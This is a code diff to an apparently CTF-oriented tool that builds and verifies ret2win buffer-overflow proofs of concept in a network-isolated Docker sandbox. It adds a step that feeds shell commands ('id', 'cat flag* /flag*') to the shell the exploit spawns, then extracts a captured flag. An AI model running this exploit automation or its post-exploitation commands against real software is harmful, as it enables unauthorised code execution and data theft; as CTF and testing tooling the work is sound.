@@ -36,6 +36,7 @@ class PoCResult:
     payload_hex: str = ""
     verified: bool = False
     run_output: str = ""
+    flag: str = ""
     notes: List[str] = field(default_factory=list)
 
 
@@ -121,11 +122,19 @@ def _docker_run(binary: str, payload: bytes) -> (bool, str):
     name = os.path.basename(binary)
     with open(os.path.join(d, ".poc_payload"), "wb") as f:
         f.write(payload + b"\n")
+    # gets()/scanf() read stdin through a buffered stdio FILE and read-ahead the whole pipe,
+    # leaving the child shell's fd 0 at EOF. So we do NOT append the shell command to the
+    # payload; instead we feed it after a short pause, once the read-ahead already happened
+    # and the shell from system("/bin/sh") is the one blocking on stdin.
+    shell_cmd = "echo ___POC_SHELL___; id; cat flag* /flag* 2>/dev/null; echo ___POC_END___"
+    run = (f"chmod +x ./{name}; "
+           f"{{ cat .poc_payload; sleep 0.5; printf '%s\\n' \"{shell_cmd}\"; sleep 0.3; }} "
+           f"| stdbuf -oL -eL ./{name} 2>&1 | head -80")
     try:
         out = subprocess.run(
             [docker, "run", "--rm", "--platform", "linux/amd64", "--network", "none",
              "--memory", "256m", "--pids-limit", "128", "-v", d + ":/w", "-w", "/w",
-             "gcc:13", "bash", "-c", f"chmod +x ./{name}; stdbuf -oL -eL ./{name} < .poc_payload 2>&1 | head -40"],
+             "gcc:13", "bash", "-c", run],
             capture_output=True, text=True, timeout=120)
         return (True, out.stdout + out.stderr)
     except subprocess.TimeoutExpired:
@@ -171,11 +180,21 @@ def autopoc(binary: str, offset: Optional[int] = None, run: bool = True) -> PoCR
         ran, output = _docker_run(binary, payload)
         r.run_output = output
         if ran:
-            markers = ("win reached", "win()", "you win", "/bin/sh", "uid=", "$ ")
-            if any(m in output.lower() for m in ("win reached", "you win", "win()")) or "uid=" in output:
+            low = output.lower()
+            shelled = "___poc_shell___" in low or "uid=" in low
+            if any(m in low for m in ("win reached", "you win", "win()")) or shelled:
                 r.verified = True
                 r.stage = "verified"
-                r.notes.append("PoC ejecutado en sandbox: objetivo alcanzado (win).")
+                if shelled:
+                    r.notes.append("PoC ejecutado en sandbox: shell obtenida (ejecuto comandos "
+                                   "tras el ret2win).")
+                else:
+                    r.notes.append("PoC ejecutado en sandbox: objetivo alcanzado (win).")
+                import re as _re
+                fm = _re.search(r"[A-Za-z0-9_]+\{[^}\n]{1,80}\}", output)
+                if fm:
+                    r.flag = fm.group(0)
+                    r.notes.append("FLAG capturada: " + r.flag)
             else:
                 r.notes.append("PoC ejecutado pero no se detecto el marcador de exito; revisa la salida.")
     return r
